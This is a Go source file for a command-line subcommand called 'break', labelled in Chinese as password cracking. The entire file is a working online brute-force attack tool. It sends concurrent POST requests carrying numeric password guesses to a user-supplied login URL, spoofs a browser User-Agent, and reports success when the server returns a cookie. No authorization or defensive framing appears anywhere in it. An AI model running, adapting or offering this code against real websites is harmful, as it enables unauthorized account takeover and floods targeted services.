/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"
)

var (
	Url    string
	Start  int64
	End    int64
	NumCpu int64
)

// breakCmd represents the break command
var breakCmd = &cobra.Command{
	Use:   "break <url>",
	Short: "密码破解",
	Long:  `密码破解`,
	Run: func(cmd *cobra.Command, args []string) {
		// fmt.Printf("cpu count: %d\n", runtime.NumCPU())
		var ch = make(chan int64, NumCpu)
		var wg sync.WaitGroup
		wg.Add(1)
		go func() {
			for i := Start; i <= End; i++ {
				ch <- i
			}
			close(ch)
			wg.Done()
		}()

		for i := range ch {
			wg.Add(1)
			go func(p int64) {
				if do(strconv.FormatInt(p, 10)) {
					fmt.Printf("password: %d\n", p)
					os.Exit(0)
				}
				wg.Done()
			}(i)
		}
		wg.Wait()
	},
}

func do(password string) bool {
	defer func(s time.Time, p string) {
		fmt.Printf("cost: %s, password: %s\n", time.Since(s), p)
	}(time.Now(), password)
	c := http.Client{
		Timeout: 5 * time.Second,
	}
	URL, err := url.Parse(Url)
	if err != nil {
		fmt.Printf("url.Parse error. %s\n", err)
		return false
	}
	header := http.Header{}
	header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	header.Set("Content-Type", "application/x-www-form-urlencoded")
	formData := url.Values{
		"password1": {password},
	}
	resp, err := c.Do(&http.Request{
		URL:    URL,
		Header: header,
		Method: "POST",
		Body:   io.NopCloser(strings.NewReader(formData.Encode())),
	})
	if err != nil {
		fmt.Printf("c.Do error. %s\n", err)
		return false
	}

	if resp.StatusCode == 200 && resp.Header.Get("Set-Cookie") != "" {
		return true
	}
	return false
}

func init() {
	rootCmd.AddCommand(breakCmd)

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// breakCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// breakCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
	breakCmd.Flags().StringVarP(&Url, "url", "u", "", "url")
	breakCmd.Flags().Int64VarP(&Start, "start", "s", 0, "start")
	breakCmd.Flags().Int64VarP(&End, "end", "e", 0, "end")
	breakCmd.Flags().Int64VarP(&NumCpu, "num", "n", 0, "num goroutine")
}
